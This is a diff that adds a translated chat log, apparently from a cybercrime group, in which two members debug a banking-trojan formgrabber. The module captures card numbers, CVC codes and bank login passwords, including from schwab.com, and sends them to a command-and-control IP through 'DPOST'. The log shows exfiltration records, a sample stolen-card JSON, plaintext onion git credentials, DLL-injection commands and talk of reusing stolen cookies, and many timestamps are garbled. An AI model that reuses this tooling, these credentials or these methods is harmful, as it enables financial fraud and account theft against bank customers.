@@ -1,0 +1,566 @@
+[26.07.21 15:49:32] frank: Hi.
+Okay, I'll take a look, I'll post later.
+It's really busy right now.
+[29.07.21 11:46:39] frank: Hey.
+Listen, can you make a bot and try to send only forms for formgrabber by cards
+For admins auction?
+[29.07.21 11:47:06] frank: Or who can I turn to for this, I would see if something comes and if not, at what stage.
+[29.07.21 11:47:30] frank: It's crashing. Maybe nothing comes at all, or maybe I have a problem.
+[29.07.21 11:47:44] frank: With transmission.
+[29.07.21 11:48:10] frank: It took me a long time to search the whole database.
+[29.07.21 12:20:04] frank: Yeah.
+[29.07.21 12:21:37] frank: Okay, I can't tell from the map.
+Basically it's all post data robbing, right?
+[29.07.21 12:23:54] frank: I was just told how to look normally
+[29.07.21 12:25:00] frank: It turns out that he sends the card data (Number) and the rest is not paired for some reason
+[29.07.21 12:25:28] frank: In general, we need to see in what format the card data there and redo the regulars maybe
+[29.07.21 12:25:42] frank: qv, expiration date
+[29.07.21 12:25:44] frank: name
+[29.07.21 12:25:54] frank: Billing, I have no idea what it is
+[29.07.21 12:28:43] frank: Yeah... It's really a mess in terms of what it counts as card data.
+[29.07.21 12:28:45] frank: Sec.
+[29.07.21 12:28:53] frank: Do you have access to the pink one?
+[29.07.21 12:32:54] frank: Look, I'll probably ask around more.
+It robs a bunch of stuff, but in order for it to work properly, you have to have specific banks and make routines for this format.
+[29.07.21 12:33:33] frank: I looked there are links, and some specified card data, but there's just a different format and regulars don't see this data
+[29.07.21 12:33:57] frank: So it's probably not on your side.
+[29.07.21 12:33:59] frank: Okay.
+[29.07.21 12:36:51] frank: Yeah, apparently
+[29.07.21 12:39:41] frank: You didn't send anything extra there?
+[29.07.21 12:40:47] frank: look what's in the pvgrab
+[29.07.21 12:40:47] frank: git:https://myla@mb5fbvx72fbod2hkirfecc5nh7lwq6ke7xocn7j2u7raiwbytvevpbad.onion|myla|mfW9F4RaSOzBuDpz1Eb git:https://n4iaacb37wmqclht.onion|flip|49LaL6JbQZhw8FuGGjmL git:https://flip@n4iaacb37wmqclht.onion|flip|49LaL6JbQZhw8FuGGjmL git:https://mb5fbvx72fbod2hkirfecc5nh7lwq6ke7xocn7j2u7raiwbytvevpbad.onion|myla|mfW9F4RaSOzZBuDpz1Eb
+[29.07.21 12:40:54] frank: That's not normal.
+[29.07.21 12:41:21] frank: Still weird.
+[29.07.21 12:42:14] frank: Okay.
+[29.07.21 12:42:26] frank: Okay, I thought it was just the browser.
+[29.07.21 12:43:27] frank: By dpost wait for adam.
+[29.07.21 12:44:56] frank: I don't know ip needed
+[29.07.21 12:47:44] frank: What kind of ip you need?
+Pads?
+[29.07.21 13:34:56] frank: Z db;e rexe gjcn pfghjcjd yt vjue gjyznm rfrjq ghj rfhns
+[29.07.21 13:35:01] frank: I see a bunch of requests
+[29.07.21 13:35:05] frank: Trying to find about maps
+[29.07.21 13:35:13] frank: Maybe you can tell me the legal name
+[29.07.21 13:35:18] frank: Where did you enter?
+[29.07.21 13:36:17] frank: You keep sending your password from that machine
+[29.07.21 13:36:36] frank: There's an iteration that our clients have access to test groups
+[29.07.21 13:36:40] frank: History
+[29.07.21 13:36:55] frank: And if someone comes in, he can access your repository
+[29.07.21 13:37:22] frank: Better ask demetrus to make you another car for tests.
+[29.07.21 13:37:47] frank: where you don't work directly with our units
+[29.07.21 13:39:52] frank: I asked for time to block all groups tst* clients, but they didn't give it yet
+[29.07.21 13:45:04] frank: You have this password on all your bots there.
+[29.07.21 14:29:35] frank: Duplicate it
+[29.07.21 14:29:54] frank: Okay.
+[29.07.21 14:32:23] frank: Yeah.
+[29.07.21 14:32:41] frank: I just don't know what kind of legal card
+[29.07.21 14:32:44] frank: He didn't parse it himself
+[29.07.21 14:34:24] frank: Well, let's you try to enter, and when you send it write down on what link this data went
+[29.07.21 14:34:34] frank: Just check
+[29.07.21 14:36:59] frank: That's where the card data should go
+[29.07.21 14:37:01] frank: ,
+[29.07.21 14:37:03] frank: ?
+[29.07.21 14:52:53] frank: did you enter card data there?
+[29.07.21 14:53:59] frank: At that link they are not, by the forms he found a login from the username, but the cards were not robbed
+[29.07.21 15:12:32] frank: Contacted Hummer, he said testers are busy
+[29.07.21 15:13:11] frank: I asked Angelo just in case he didn't answer either
+[29.07.21 15:13:24] frank: I have no idea either.
+[29.07.21 15:31:26] frank: No response yet
+[29.07.21 15:31:32] frank: This link
+[29.07.21 15:31:41] frank: logpost
+[29.07.21 16:01:36] frank: Can you tell me the command that sends the logpost
+[29.07.21 16:02:28] frank: Bot went off for some reason
+[29.07.21 16:11:55] frank: Okay. Actually I see that the card number came
+[29.07.21 16:12:14] frank: Last point, is there an option somewhere with cvv and date to enter the data?
+[29.07.21 16:19:56] frank: And if you take the exchanger
+[29.07.21 16:20:03] frank: Ah.
+[29.07.21 16:20:06] frank: It doesn't need a qv
+[29.07.21 16:20:23] frank: You can't buy tickets anywhere
+[29.07.21 16:20:37] frank: Like concert venues
+[29.07.21 16:21:10] frank: Or "pay for hosting"
+[29.07.21 16:26:44] frank: ))))
+[29.07.21 16:30:24] frank: It's hard to find.
+[29.07.21 16:30:31] frank: And what legal entity did you enter your data in?
+[29.07.21 16:31:16] frank: The same bot?
+[29.07.21 16:38:13] frank: The card got hit
+[29.07.21 16:38:18] frank: {"mdOrder":"e6634c11-903f-74d1-8ebc-3032023bf0c2","pan":"4627100101654724","cvc":"123","expiry":"202512","cardholder":"CARDHOLDER NAME","externalBindingNotNeeded":false,"language":"ru"}
+[29.07.21 16:38:42] frank: But I didn't understand what kind of data there
+[29.07.21 16:38:47] frank: Only the number got it
+[29.07.21 16:39:52] frank: Anyway, thanks for the help, everything works. On my side is complexity - I need to write regulars.
+[29.07.21 16:42:52] frank: You sent me the password again
+[29.07.21 16:43:07] frank: Please, figure it out.
+This bot with the map will be watched for sure.
+[29.07.21 16:43:43] frank: myla|6e5b87546cc70fcb26a18fab6c4462c5
+[29.07.21 16:44:40] frank: They'll shove something in your face.
+[29.07.21 16:45:06] frank: https://n4iaacb37wmqclht.onion/
+[29.07.21 16:45:09] frank: You got burned too.
+[29.07.21 16:45:24] frank: +
+[29.07.21 16:45:38] frank: now I will try to cull the bot.
+[29.07.21 16:46:13] frank: Well, just showing our repositories is not good
+[29.07.21 16:47:02] frank: I'm not a security guy.
+I'm paranoid)
+[29.07.21 16:49:36] frank: You don't have user in pink, do you?
+[29.07.21 16:49:50] frank: I'll close this group for everyone.
+[29.07.21 16:50:09] frank: Only the black one?
+[29.07.21 16:50:25] frank: Okay.
+[29.07.21 16:52:02] frank: Okay.
+[29.07.21 16:55:08] frank: Closed, but in any case I'll have to check the whole database now and cull the records.
+[29.07.21 16:55:31] frank: Ok, good luck!
+[30.08.21 13:57:34] jaime: Hi.
+[30.08.21 13:57:53] frank: Hi.
+[30.08.21 13:57:56] jaime: What about formgraber? No data?
+[30.08.21 14:13:13] frank: One admin is okay.
+[30.08.21 14:13:13] frank: The second one is not working
+[30.08.21 14:20:28] jaime: Anything for me to watch?
+[30.08.21 14:26:12] frank: No, it's not about module.
+[08.09.21 12:44:28] jaime: Hi.
+[08.09.21 12:44:45] frank: Hi.
+[08.09.21 12:45:01] jaime: Form GB does not log, it just sends data
+[08.09.21 12:45:29] jaime: I can't go into admin area, I can do a test with specified numbers
+[08.09.21 12:45:47] jaime: I have no access to admin
+[08.09.21 12:47:39] frank: I see.
+So you need yurls that haven't been sent and you can test them?
+Do we have any filters on what it robs or does it have to pull everything from the history?
+[08.09.21 12:53:47] jaime: Yes, we will
+[08.09.21 12:54:07] jaime: I'll debug it and see
+[08.09.21 12:55:57] frank: And what about filters do we have?
+[08.09.21 13:07:36] jaime: There are dynamic and static swap rules, and if none of them works, it just dump POST
+[08.09.21 13:08:38] jaime: There are some nuances with it too. For example, if server where DPOST is sent didn't respond, then for 10 minutes we cut off attempts
+[29.09.21 13:42:11] jaime: Hi.
+[29.09.21 13:42:20] frank: Hi.
+[29.09.21 13:42:41] jaime: About the problem. How it does not show e-mail?
+[29.09.21 13:42:49] jaime: I have no login to admin
+[29.09.21 13:43:27] frank: I guess they import cookies
+[29.09.21 13:43:40] frank: And they try to enter the mail
+[29.09.21 13:43:41] jaime: Yeah.
+[29.09.21 13:44:00] frank: I can get the cookie off
+[29.09.21 13:44:05] jaime: By symported cookies?
+[29.09.21 13:44:09] frank: Yes
+[29.09.21 13:44:21] jaime: Is it like a super browser?
+[29.09.21 13:44:39] frank: Well, what do you need to test?
+I think so, they have a link everywhere, I was told the dedicator
+[29.09.21 13:44:57] frank: I can check if they tried it with SB.
+[29.09.21 13:46:01] jaime: I got it. I thought something else. I don't know how to log in with a grabbed cookie.
+[29.09.21 13:46:07] jaime: :)
+[29.09.21 13:46:34] jaime: I thought there is something wrong with webinjeckt like there is no login on the page
+[29.09.21 13:46:34] frank: Do you know who can, I just do not know how to do it either.
+[29.09.21 13:46:59] jaime: I'll get Angelo to do it, maybe he knows.
+[29.09.21 13:47:10] jaime: He once tested SuperBrowser
+[29.09.21 13:47:12] frank: Okay. Thanks.
+[29.09.21 13:51:39] jaime: Angelo confirmed Silver's words :)
+[29.09.21 13:53:53] frank: Okay.
+[01.11.21 12:51:53] jaime: Hi!
+[01.11.21 12:52:52] frank: Hi
+[01.11.21 12:53:24] frank: I'll take a look at the car now.
+[01.11.21 12:53:31] frank: We need to restart the auction
+[01.11.21 12:54:14] jaime: I have everything ready, let's see the log post from schwab where does it go?
+[01.11.21 13:22:52] frank: Something strange
+[01.11.21 13:24:26] frank: EC1BBC962A404D9A8D9D8E3BCDBAD781 did you send this bot to auction?
+[01.11.21 13:36:35] jaime: EC1BBC962A404D9A8D9E8E3BCDBAD781 yes it is, but it is not a bot
+[01.11.21 13:37:05] jaime: it's just a module configured on zev11 to check grab
+[01.11.21 13:37:55] frank: I'm just looking, and do not see the same data on the input, please restart again, I cleaned the logs
+[01.11.21 13:38:10] jaime: Sure now
+[01.11.21 13:38:12] frank: I'll try to copy all requests
+[01.11.21 13:39:00] jaime: running
+[01.11.21 13:39:24] jaime: Go to https://www.schwab.com/ now
+[01.11.21 13:40:26] jaime: URI=http://195.39.233.29:443/zev11/QWERTY_W617600.11FD0A215899476E89D598EAD930AD31/60/ I see gone
+[01.11.21 13:40:37] jaime: /1/ came
+[01.11.21 13:40:52] frank: And in the input logs what went out can you look?
+[01.11.21 13:40:56] frank: Is there a log\pass?
+[01.11.21 13:41:03] jaime: user: superman, pass: supermanlox
+[01.11.21 13:42:01] jaime: ``/api/v2/web/assert?aid=sws_web&did=5bca9424-d84f-4059-ac0a-6ce65ad9fb49&sid=42460d8f-79b4-49ac-8843-f06acf23dfd9&locale=ru-RU&clientId=CustomerWeb&sessionId=20880915-e4e8-41b5-8819-8f1dc66bd523&correlationId=11ac9ce3-6396-45cd-9b99-80005e86d938&throttle=true
+
+```
+[01.11.21 13:42:32] jaime: This log is not detailed, there is the same log recorded on my server
+[01.11.21 13:43:09] jaime: https://privnote.com/AWgp8yTW#AtaX2W6I4
+[01.11.21 13:44:23] jaime: There's a field {"headers":[{"type": "uid", "uid": "superman"}] - it's a login, and there's a "data":{"password": "supermanlox"}
+[01.11.21 13:46:39] jaime: Maybe it's the link field that's going wrong?
+[01.11.21 13:55:12] frank: I don't see anywhere...
+[01.11.21 13:55:48] frank: Go again
+[01.11.21 13:55:58] frank: I reconfigured something here
+[01.11.21 13:56:39] jaime: Yeah now
+[01.11.21 13:57:28] jaime: Send here http://195.39.233.29:443
+[01.11.21 13:58:34] jaime: ``
+DPOST URI=http://195.39.233.29:443/zev11/QWERTY_W617600.75C40C477CB4428099EC34360A24C70B/60/ DATA=POST /i/13884/da/?type=multi&wid=263675&sid=5AAFA4548E33AE863E51AA13488D0153BD&pvid=1635775077173&dnt=1&dc=5&dv=1&dl=995&retryCode=socketTimeout HTTP/1.1
+```
+[01.11.21 13:58:46] jaime: 01.11.2021 16:58:11 DPOST response: /1/
+[01.11.21 13:59:12] jaime: ``
+DPOST URI=http://195.39.233.29:443/zev11/QWERTY_W617600.75C40C477CB4428099EC34360A24C70B/60/ DATA=POST /api/v2/web/assert?aid=sws_web&did=5bca9424-d84f-4059-ac0a-6ce65ad9fb49&sid=6108420e-8015-4b13-a46d-6c3fceba7664&locale=ru-RU&clientId=CustomerWeb&sessionId=1ee95221-9621-4bfe-b83b-7f7096efd006&correlationId=8d43ea91-460a-4c90-a6f9-8c3536b3ffc8&throttle=true HTTP/1.1
+```
+[01.11.21 13:59:35] jaime: This is where the password should be, inside the POST
+[01.11.21 14:05:25] frank: The login password comes
+[01.11.21 14:06:00] frank: Is there any way to do the same thing with bot ch, to check the whole chain?
+[01.11.21 14:07:34] jaime: You have to ask Hammer or Angelo
+[01.11.21 14:07:42] jaime: I'll try to find someone
+[01.11.21 14:11:23] jaime: Angelo will check it out
+[01.11.21 14:33:16] frank: Is there an option on the bot to do it on normal?
+[01.11.21 14:33:23] frank: To see the whole chain
+[01.11.21 14:37:04] jaime: Anything from you? It's like a couple of messages.
+[01.11.21 14:39:53] frank: otr
+[01.11.21 14:42:23] frank: duplicate
+[01.11.21 14:42:29] frank: Or write a toad
+[01.11.21 14:42:37] frank: This site doesn't work properly
+[01.11.21 14:42:41] jaime: We need to ask Hammer or Angelo from the bot.
+I'll try to find someone.
+Angelo's gonna check it out.
+[01.11.21 14:42:57] jaime: OTR is gone somewhere
+[11/18/21 21 17:25:52] frank: Hey, you're not in touch?
+[11/18/21 18:21:31] jaime: hi!
+[11/18/21/18:21:33] jaime: Right here.
+[11/18/21 21 18:21:39] jaime: I've been raiding!
+[11/18/21 18:21:55] jaime: I'm gonna grab a bite to eat and then I'll be there!
+[11/18/21 18:21:59] jaime: Write what you need!
+[18.11.21 18:22:23] frank: I wanted to ask you, do you know where the bot id comes from?
+[11/18/21 21 18:22:54] frank: How come it is unique all the time, it comes from the back when connecting
+Or is it some kind of unique thing from the target machine?
+[18.11.21 18:23:08] frank: E2BBE7BF7C3BBFDA332F1EDF119F7158
+[18.11.21 18:23:12] frank: Like this
+[11/18/21 18:32:19] jaime: I'm not telling you, Caesar's giving it to me. He's the one who knows.
+[11/18/21 18:35:17] jaime: Something unique needs to be pulled. Maybe the serial number of the screw. Do you want to simplify it?
+[11/18/21/18:48:53] frank: Yeah.
+[11/18/21 21 18:48:58] frank: Okay, I'll ask him.
+[11/18/21 18:53:10] jaime: If we could get rid of int 64 it would be great!
+[11/18/21 18:55:15] jaime: What if the table with the botid and index from there on the other data?
+[18.11.21 18:56:05] jaime: By idea from the first one to choose quickly, and with int then the rest will be normal
+[18.11.21 18:58:43] jaime: I can't give you advice, though :)
+[11/18/21 19:08:47] jaime: And here's more. From the forms of the grabber flies all sorts of garbage probably 90 percent maybe more. all sorts of statistics and stuff, can it cut? By url? Select what is most there do not need and the hell do not send?
+[25.11.21 10:33:01] frank: Hi
+[25.11.21 11:09:22] jaime: Hi!
+[25.11.21 11:11:16] frank: I'm trying to understand, you angelo wrote that session cookies are not parsed...
+Did I understand you correctly?
+
+Or did you mean that there should be these cookies and you just described the principle?
+[25.11.21 11:18:24] jaime: No I just meant the principle
+[25.11.21 11:18:53] jaime: Judging by what he showed me, there are no session cookies, just some settings
+[25.11.21 11:19:16] jaime: Either they did not come and were not added to the database, or they were not uploaded
+[25.11.21 11:19:25] jaime: There's something wrong there.
+[25.11.21 11:21:33] jaime: Angelo didn't show you?
+[07.12.21 17:49:18] frank: Hey.
+[07.12.21 18:46:53] jaime: Hi!
+[07.12.21 21 21:29:36] frank: I'll write tomorrow.
+[08.12.21 11:13:37] jaime: Hi!
+[08.12.21 11:13:53] jaime: Yesterday we didn't write off. :)
+[08.12.21 11:25:56] frank: Hi!
+Hammer says something not healthy is going on with the formgrabber.
+I'll bring it into general question.
+[08.12.21 11:27:18] jaime: It is strange, yesterday I think he tested it and said it was normal.
+[08.12.21 11:27:34] jaime: There were problems because of the injector config
+[08.12.21 11:27:39] jaime: Adam removed it
+[08.12.21 11:48:17] jaime: https://privnote.com/ArOORfsk#Fx9DBkQXs
+[08.12.21 11:48:31] jaime: By POST format
+[08.12.21 11:51:58] frank: Is this from yesterday's bot?
+(On which the logs didn't come)
+[08.12.21 11:52:47] jaime: Not that abstraction. I took it now
+[08.12.21 11:52:57] jaime: There is no such level of logs right now
+[08.12.21 11:53:16] jaime: You need to dump the whole POST
+[08.12.21 11:53:39] jaime: I dumped it on the server
+[08.12.21 11:54:26] jaime: I will log the whole POST now.
+[08.12.21 11:54:36] jaime: But I will have to repeat the experiment
+[08.12.21 11:57:52] frank: The stuff you uploaded is also okay. I need to recode it and split it, but I could deal with that already.
+In any case, it will be necessary in the future, in case there will be problems and you need to understand what's wrong.
+[08.12.21 11:58:16] jaime: Let's put raw POST logs into a separate file
+[08.12.21 11:58:28] frank: Ok, thanks!
+[08.12.21 11:58:44] jaime: You're welcome! :)
+[08.12.21 15:59:22] jaime: In POST can you get binary data?
+[08.12.21 16:01:39] frank: How can I check it?
+There's a binary data conversion on the back
+[08.12.21 16:13:43] jaime: 2021-12-08 18:54:51: DPOST data: POST /tst261/DESKTOP-149IKLJ_W10019043.9FD9E23BBD5964BFA4D5C3BB8BF7E7E3/60/ sent here
+[08.12.21 16:14:06] frank: Okay, what do you need to find?
+[08.12.21 16:14:31] jaime: What happened to them?
+[08.12.21 16:14:49] jaime: No damage what?
+[08.12.21 16:14:52] frank: Auction?
+or dnog?
+[08.12.21 16:15:08] frank: Or dnog?)
+[08.12.21 16:15:24] jaime: ``
+-----------JGPGYHQLPZTOMECV
+Content-Disposition: form-data; name="data"
+
+POST /gts1c3 HTTP/1.1
+Host: ocsp.pki.goog
+User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:95.0) Gecko/20100101 Firefox/95.0
+Accept: */*
+Accept-Language: en-GB,en;q=0.5
+Accept-Encoding: gzip, deflate
+Content-Type: application/ocsp-request
+Content-Length: 84
+Connection: keep-alive
+Pragma: no-cache
+Cache-Control: no-cache
+
+0R0P0N0L0J0 + Ç.yŠÝa4³ºíGB¸"ÆÀ$cŠt¯...Íî-Í=œÐâFóq5' ¾'|--¦wþ
+   Qˆ
+-----------JGPGYHQLPZTOMECV
+
+```
+[08.12.21 16:15:38] jaime: I can't tell you.
+[08.12.21 16:15:46] frank: Okay, I'll check both
+[08.12.21 16:15:49] frank: Sec.
+[08.12.21 16:36:38] frank: They're on the input.
+\r\nAccept-Language: en-GB,en;q=0.5Inccept-Encoding: gzip, deflate\rContent-Type: application/ocsp-request\r\nContent-Length: 84\r\nConnection: keep-alive\r\nPragma: no-cache\r\nCache-Control: no-cache\r\n\r\n0R0P0N0L0J0\t\u0006\u0005+\u000E\u0003\u0002\u001A\u0005\u0000\u0004\u0014Ç.y<8a>Ýÿa4³ºíGB¸»ÆÀ$\u0007c\u0004\u0014<8a>t^?¯<85>Íî<95>Í=<9c>ÐâF\u0014óq5\u001D'\u0002\u0011\u0000¾<92>|<97><97>¦wþ\n\u0000\u0000\u0000\u0001\u0019Q<88>\u0000\r\n-----------JGPGYHQLPZTOMECV\r\nContent-Disposition: form-data; name=\"keys\"\r\n\r\n\r\n-----------JGYPGYHQLPZTOMECV\r\nContent-Disposition: form-data; name=\"link\"\r\n\r\n\nhttp://ocsp.pki.goog/gts1c3\r\n-----------JGPGYHQLPZTOMECV--\r\n"
+[12/12/221 16:37:15] frank: I understand there is an error somewhere with them.
+They are not on the bot itself?
+[08.12.21 16:37:32] frank: They are data.)
+[08.12.21 16:40:10] jaime: I do not have access to the admin panel! :)
+[08.12.21 16:40:44] jaime: I just do not really understand how we will check whether everything arrives or not?
+[08 12/221 16:41:12] jaime: I added logging. Everything is written to a separate file. You can watch.
+[08.12.21 16:45:08] frank: I didn't know it didn't.
+I'll check it myself now.
+[08.12.21 16:47:58] jaime: I'm gonna be gone for an hour. My wife's here, I have to entertain her with dinner! :)
+[08.12.21 16:48:49] frank: Here's the info in the admin area.
+[08.12.21 16:49:04] frank: ``
+/gts1c3
+Host
+ocsp.pki.goog
+User-Agent
+Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:95.0) Gecko/20100101 Firefox/95.0
+Content-Type
+application/ocsp-request
+Content-Length
+83
+Unknown
+0Q0O0M0K0I0 +Ç.yÝa4³ºíGB¸"ÆÀ$ct¯ ÍîÍ=ÐâFóq5'sxÝÈêÅ Sg
+```
+[08.12.21 16:49:21] frank: ``
+Link ID
+38137010
+Link
+http://ocsp.pki.goog/gts1c3
+Region Name
+13
+Resolve
+ip-144-21.dataclub.eu
+Net
+tst261
+IP
+109.248.144.21
+Date Time
+2021-12-08 18:29:41.085823
+Country
+Kazakhstan
+OS
+windows
+OS Version
+10019043
+```
+[08.12.21 16:50:13] frank: I don't think it all came through
+[08.12.21 16:50:14] frank: )
+[08.12.21 16:50:47] frank: Is that right?
+[08.12.21 16:55:52] jaime: Well, it looks like
+[08.12.21 16:56:16] jaime: That was some kind of statistic.
+[08.12.21 17:00:11] frank: Not enough characters
+[08.12.21 17:00:18] frank: I think, maybe we'll use binary data like in cookies
+[08.12.21 17:00:19] frank: Would you encode it in b64?
+[08.12.21 17:13:27] jaime: How do you know if they are binary or not?
+[08.12.21 17:13:52] jaime: Run through and look at the range?
+[08.12.21 17:13:58] frank: Everything is encoded in cookies.
+[08.12.21 17:14:39] jaime: Yes I think you can redo it.
+[08.12.21 17:15:09] jaime: Content-Length: must be recalculated?
+[08.12.21 17:18:06] jaime: Content-Disposition: form-data; name="data" do I pack everything in b64?
+[08.12.21 17:19:33] frank: I think so. We're solving the problem now that the data isn't complete if it's binary...
+Make a test module then, check how it will be, and when you will ask caesar to fill in, ask to fill in the auction and not on the dnog.
+[08.12.21 17:19:55] frank: There's a chance we'll solve the problem with missing data that way too
+[08.12.21 17:20:18] jaime: Got it. I'll try to do it tomorrow.
+[08.12.21 17:20:19] frank: Maybe there are some statistics in binary format and they bug at the stage of writing to the database.
+[08.12.21 18:03:27] jaime: https://privnote.com/bLOvlWGg#pe7HSGTYB
+[08.12.21 18:03:34] jaime: Is it normal?
+[08.12.21 18:07:59] frank: Yes.
+[08.12.21 18:14:52] jaime: Probably tomorrow, Caesar is gone. Let's go to Auction!
+[10.12.21 10:15:28] frank: Hi.
+[10.12.21 10:21:05] jaime: Hi!
+[10.12.21 10:25:50] frank: i have a question, did you upload a new formgrabber module to the auction and if so, is it correct that it is uploaded in test format now7
+[10.12.21 10:26:35] frank: that means you did not replace the old one but poured it next to it, I mean the recoded formgrabber.
+[10.12.21 10:27:06] frank: where's b64
+[10.12.21 10:27:30] jaime: Yes, I uploaded only a test version to the auction. With b64 support
+[10.12.21 10:27:42] jaime: Absolutely right
+[10.12.21 10:27:55] jaime: It has to be run with separate command
+[10.12.21 10:28:11] frank: I see.
+It's just the date doesn't load.
+[10.12.21 10:28:26] frank: I'll keep checking
+[10.12.21 10:29:41] jaime: I don't think anyone except Hammer downloaded the module
+[10.12.21 10:30:34] jaime: So it probably won't load, you wait in b64, and it goes the old way
+[10.12.21 10:31:09] jaime: maybe you should have made b64data instead of date, it would have been clearer?
+[10.12.21 10:32:21] frank: No, I haven't uploaded new code yet
+[10.12.21 10:32:32] frank: That's why I asked you, I thought maybe we have a lag
+[10.12.21 10:36:25] jaime: haven't put into battle, I need to check it :)
+[10.12.21 10:43:48] frank: Ok
+[12/13/21 17:06:48] jaime: Hi!
+[12/13/21 17:07:04] frank: Hi.
+[12/13/21 17:08:00] jaime: What's up with b64? What's wrong?
+[12/13/221 17:08:52] frank: I'm trying to finish, I don't really understand what Hammer says
+[12/13/221 17:09:13] frank: heimi did not write about why there is no data in the data logpost? I threw him a log, it's because of the wrong encryption
+4:29 PM
+10 min
+4:29 PM
+Did the messages get through?
+4:30 PM
+yes
+4:34 PM
+It goes like this when you decode
+POST /dns-query HTTP/1.1
+Host: chrome.cloudflare-dns.com
+Connection: keep-alive
+Content-Length: 128
+Accept: application/dns-message
+Accept-Language: *
+User-Agent: Chrome
+Accept-Encoding: gzip;q=1,deflate,br;q=0
+Content-Type: application/dns-message
+
+���������wwwgstaticcom�����)������T� �P���������������������������������������������������������������������������������
+4:41 PM
+hmm
+What kind of encryption is this?
+So it's on the bot itself somewhere?
+It turns out that in this form it comes to the server and there is a bug in my place?
+How can I help in this whole story, what I need from me?
+Not while himey hasn't written
+4:59 PM
+this is from the dpost log
+that heimi added, the raw one.
+it turns out he sends it, but the admin can not decipher it and does not show
+you'd better write to him, he'll tell you better, he and I looked at it on Friday
+it's got to be fixed, otherwise I'll never see what's in it.
+[12/13/221 17:11:52] jaime: I put all data field into base64, the header is correct, but the data is binary. I don't know what to do with them.
+[13.12.21 17:12:12] jaime: So everything looks ok.
+[13.12.21 17:12:34] frank: I understand this is a separate module, right?
+[13.12.21 17:12:38] frank: Kind of a test one.
+[12/13/221 17:13:01] frank: And now he watches logs and because there is b64 he cannot read?
+[12/13/221 17:13:52] frank: Do I get it right, you just need to add recoding?
+Or is it some more serious problem?
+[12/13/221 17:14:52] jaime: That's right. It's a test and it's not getting it because there's no recoding.
+[12/13/21/17:15:06] frank: Okay.
+[13.12.21 17:15:12] jaime: Can I put data64 instead of date?
+[12/13/21 17:15:13] frank: I got it.
+[12/13/21 17:15:35] frank: Okay.
+[12/13/21 21 17:15:43] frank: It would be much easier for me.
+[12/13/21 21 17:15:56] jaime: I can duplicate it.
+[12/13/21 17:16:29] frank: Okay, let's do it this way, I'll just output a transcoded version separately to see if that's what we need.
+[12/13/221 17:16:38] jaime: It's just bullshit.
+[12/13/21/17:19:24] frank: Yes. Well, we need to test it somehow.
+[13.12.21 17:19:38] frank: I can do it now, but I can't check it in admin.
+[15.12.21 13:51:57] frank: Hi, did you add this field with b64 separately to the test build?
+[15.12.21 14:09:53] jaime: Hi!
+[15.12.21 14:10:01] jaime: No I haven't changed anything goes into data
+[12/15/221 14:32:49] frank: Okay. Would you be able to do that? How's your time today-tomorrow?
+I'm facing a choice right now that I can replace the code in the auction, but not the fact that it will work
+Will start writing operators, if something goes wrong...
+On the other hand hammer writes that it needs to be tested because some of the data does not reach the formgrabber in our old format.
+We understood then, that it's binary data that doesn't reach, this feature should essentially close the issue with this unreachable data.
+[15.12.21 14:33:15] frank: But so far I have no idea why from time to time the data stop coming in the usual format.
+[12/15/221 14:34:33] frank: I took too long time to write new code for sending logpost to storage, but I'll try to put it to auction one day, there everything will go in one thread in big batches, if it doesn't solve the problem.
+[15.12.21 14:37:24] jaime: Yes, today I will, let's call the field datab64.
+[15.12.21 14:38:05] frank: Ok, here's another question
+Is there any way to understand that the data is binary, and not normal
+[15.12.21 14:38:13] jaime: I'll do it.
+[15.12.21 14:38:19] frank: On the module or maybe mark them somehow
+[15.12.21 14:38:23] frank: Okay.
+[12/15/221 14:38:55] jaime: I don't know myself, I'm just POSTing. Only by application-content ?
+[12/15/221 14:41:00] frank: Ok ok, let's do what we planned and check again.
+[12/15/21 16:29:35] jaime: So I added
+[12/15/21 16:29:46] jaime: I can send the tests.
+[12/15/221 16:30:05] frank: Great!
+What command launches this test module?
+[15.12.21 16:30:14] frank: Or is it for cesu?
+[15.12.21 16:30:19] jaime: Ha, I'm the only one with it.
+[12/15/21 16:30:26] frank: Ah.
+[15.12.21 16:30:29] jaime: Yeah, Caesar's not up to date.
+[15.12.21 16:30:53] frank: Ok, write me as you upload to the auction, I'll change too.
+[15.12.21 16:31:18] jaime: Or we'll wait for Caesar
+[15.12.21 16:31:21] jaime: Copy that.
+[15.12.21 16:32:27] jaime: datab64 will be packed, data the old-fashioned way.
+[12/15/21 16:32:53] frank: Okay.
+[12/16/21 17:03:32] frank: Hi.
+[12/16/21 17:07:39] jaime: Hi!
+[16.12.21 17:07:48] jaime: We just fill module
+[16.12.21 17:07:59] jaime: Waiting for Caesar
+[16.12.21 17:08:08] jaime: Uploading via Adam
+[16.12.21 17:11:11] frank: Got it.
+[16.12.21 17:11:13] frank: Okay.
+[16.12.21 17:31:09] frank: Start on 62?
+tinjectDll start?
+[16.12.21 17:36:44] frank: Adam answered irrelevant.
+[16.12.21 17:37:03] jaime: What does that mean?
+[16.12.21 17:37:31] jaime: tinjectDll64 can it?
+[16.12.21 17:47:29] frank: Okay, I'll try it that way.
+[16.12.21 17:47:43] jaime: tinjectDll start
+[16.12.21 17:47:55] jaime: Adam said
+[16.12.21 17:48:04] frank: Okay.
+[12/16/21 19:05:49] jaime: How's the help there?
+[12/16/21 19:07:00] frank: Not yet. Hammer will check everything tomorrow, I am in the process of finalizing the code.
+[12/23/221 15:43:10] jaime: Hi!
+[12/23/221 15:44:01] frank: Hi
+[12/23/221 15:44:02] jaime: There's data coming to you with Content-Encoding: gzip they are binary of course
+[12/23/221 15:44:07] jaime: Hi!
+[12/23/221 15:44:29] frank: Okay, they're not coming?
+[12/23/221 15:44:31] frank: Or what?
+[12/23/221 15:44:59] frank: I've done both for now...
+[12/23/221 15:45:07] frank: I mean both in b64 and plain
+[12/23/221 15:45:31] jaime: yes we pass both.
+[23.12.21 15:45:35] frank: Here I am thinking how to check separately... Asked the hummer to run a simple tap, but it does not pass.
+[23.12.21 15:45:48] frank: To make sure it works at all...
+[12/23/221 15:46:09] jaime: And judging by the logs there is /1/ coming
+[23.12.21 15:46:17] frank: I see that data I send manually goes.
+[23.12.21 15:46:35] frank: That's how to understand what old format is coming from bot.
+[12/23/221 15:47:33] jaime: As far as I understand Hammer nothing comes at all
+[12/23/221 15:48:02] jaime: He had a suspicion about this binary data
+[12/23/221 15:48:41] jaime: But I started watching it normally, I don't know what to do with it, but the data is correct
+[12/23/221 15:49:15] frank: Okay, so now it's not going because of the binary data?
+[12/23/221 15:49:41] jaime: I don't think anything's going on at all
+[12/23/221 15:50:03] frank: I don't know...
